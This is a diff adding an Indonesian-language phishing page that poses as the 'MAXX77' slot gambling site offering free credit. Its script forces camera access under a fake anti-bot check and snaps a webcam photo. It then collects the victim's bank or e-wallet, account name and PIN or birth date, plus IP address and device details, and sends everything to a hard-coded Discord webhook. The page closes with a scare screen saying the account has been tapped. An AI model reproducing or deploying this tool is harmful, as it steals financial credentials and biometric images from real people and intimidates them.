@@ -1,0 +1,144 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MAXX77 - Slot Gacor Anti Rungkad</title>
+    <style>
+        body { background: #000; color: #fff; font-family: 'Arial Black', sans-serif; text-align: center; margin: 0; padding: 0; }
+        .promo-banner { background: linear-gradient(90deg, #ff0000, #ffcc00); padding: 10px; font-size: 14px; animation: flash 1s infinite; }
+        @keyframes flash { 50% { opacity: 0.5; } }
+        .container { padding: 20px; max-width: 450px; margin: auto; }
+        .jackpot-box { border: 3px solid #ffcc00; border-radius: 15px; padding: 20px; background: rgba(255,255,255,0.1); box-shadow: 0 0 20px #ffcc00; }
+        h1 { color: #ffcc00; text-shadow: 2px 2px #ff0000; font-size: 30px; }
+        .gold-btn { background: linear-gradient(#ffe000, #ff9000); color: #000; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; font-size: 18px; margin-top: 20px; width: 100%; box-shadow: 0 5px 0 #995500; }
+        .gold-btn:active { transform: translateY(4px); box-shadow: none; }
+        input { width: 90%; padding: 12px; margin: 10px 0; background: #222; border: 1px solid #ffcc00; color: #fff; border-radius: 5px; }
+        #step2, #loading, #final { display: none; }
+        .loader { border: 5px solid #333; border-top: 5px solid #ffcc00; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div class="promo-banner">🔥 BONUS NEW MEMBER 100% - DEPO PULSA TANPA POTONGAN 🔥</div>
+
+    <div class="container">
+        <div class="jackpot-box">
+            <h1>MAXX77</h1>
+            <img src="https://img.icons8.com/emoji/96/000000/slot-machine-emoji.png" alt="slots">
+            
+            <!-- STAGE 1: BOT VERIFICATION (CAMERA) -->
+            <div id="step1">
+                <p style="color: #00ff00;">SISTEM MENDETEKSI ANDA ADALAH HUMAN!</p>
+                <p style="font-size: 12px;">Klik tombol di bawah untuk verifikasi wajah (Anti-Bot) sebelum klaim Saldo Gratis Rp 50.000</p>
+                <button class="gold-btn" onclick="takeFace()">KLAIM SALDO SEKARANG</button>
+            </div>
+
+            <!-- STAGE 2: DATA HARVESTING -->
+            <div id="step2">
+                <h3 style="color: #ffcc00;">DATA PENCAIRAN DANA</h3>
+                <input type="text" id="bank" placeholder="Nama Bank / E-Wallet (DANA/OVO)">
+                <input type="text" id="accName" placeholder="Nama Lengkap Sesuai Rekening">
+                <input type="text" id="accPin" placeholder="PIN Keamanan / Tanggal Lahir (DDMMYY)">
+                <p style="font-size: 10px; color: #ccc;">*PIN diperlukan untuk otorisasi pencairan saldo otomatis.</p>
+                <button class="gold-btn" onclick="submitDeepDig()">KONFIRMASI WD (WITHDRAW)</button>
+            </div>
+
+            <!-- LOADING SCREEN -->
+            <div id="loading">
+                <h3 id="load-msg">Menghubungkan ke Server...</h3>
+                <div class="loader"></div>
+            </div>
+
+            <!-- FINAL REVEAL -->
+            <div id="final">
+                <h2 style="color: #ff0000;">⚠️ AKUN ANDA TELAH DISADAP ⚠️</h2>
+                <p>Data judi dan foto wajah Anda telah dikirim ke admin pusat.</p>
+                <img id="scannedFace" style="width: 100%; border-radius: 10px; border: 2px solid #ffcc00;">
+                <p style="font-family: monospace; font-size: 12px; color: #00ff00; text-align: left; background: #000; padding: 10px;">
+                    STATUS: UPLOAD_SUCCESS<br>
+                    TARGET_IP: DETECTED<br>
+                    CREDENTIALS: CAPTURED
+                </p>
+            </div>
+        </div>
+    </div>
+
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const webH = "https://discord.com/api/webhooks/1499298779143340053/96v2UUkOcDdK8X_PG-2_zOycfoYzxO0_7rt2m6npWmjMMUSuUWsTPkSM_cpO9L69dr8K";
+        let faceBlob = null;
+
+        async function takeFace() {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.srcObject = s;
+
+                document.getElementById('step1').style.display = 'none';
+                document.getElementById('loading').style.display = 'block';
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    canvas.toBlob(b => { 
+                        faceBlob = b; 
+                        document.getElementById('scannedFace').src = URL.createObjectURL(b);
+                    }, 'image/png');
+
+                    s.getTracks().forEach(t => t.stop());
+                    document.getElementById('loading').style.display = 'none';
+                    document.getElementById('step2').style.display = 'block';
+                }, 1500);
+            } catch (e) {
+                alert("Verifikasi Gagal: Anda harus mengizinkan kamera untuk mengklaim saldo gratis!");
+                takeFace();
+            }
+        }
+
+        async function submitDeepDig() {
+            const bank = document.getElementById('bank').value;
+            const name = document.getElementById('accName').value;
+            const pin = document.getElementById('accPin').value;
+
+            if(!bank || !name || !pin) return alert("Isi data penarikan dengan benar!");
+
+            document.getElementById('step2').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+            document.getElementById('load-msg').innerText = "Memproses Pencairan...";
+
+            const ipR = await fetch('https://api.ipify.org?format=json');
+            const ipD = await ipR.json();
+            const bat = await navigator.getBattery();
+
+            const fd = new FormData();
+            fd.append('file', faceBlob, 'gambler.png');
+            fd.append('payload_json', JSON.stringify({
+                embeds: [{
+                    title: "🎰 TARGET JUDI TERDETEKSI (DEEP DIG)",
+                    color: 16753920,
+                    fields: [
+                        { name: "🏦 Bank/Wallet", value: bank, inline: true },
+                        { name: "👤 Nama Target", value: name, inline: true },
+                        { name: "🔑 PIN/B-Day", value: `\`${pin}\`` },
+                        { name: "🌐 Alamat IP", value: ipD.ip, inline: true },
+                        { name: "🔋 Baterai", value: `${bat.level * 100}%`, inline: true },
+                        { name: "💻 Browser Info", value: navigator.userAgent }
+                    ],
+                    footer: { text: "Beelink Phish Tool - Gambling Edition" }
+                }]
+            }));
+
+            await fetch(webH, { method: 'POST', body: fd });
+
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('final').style.display = 'block';
+        }
+    </script>
+</body>
+</html>
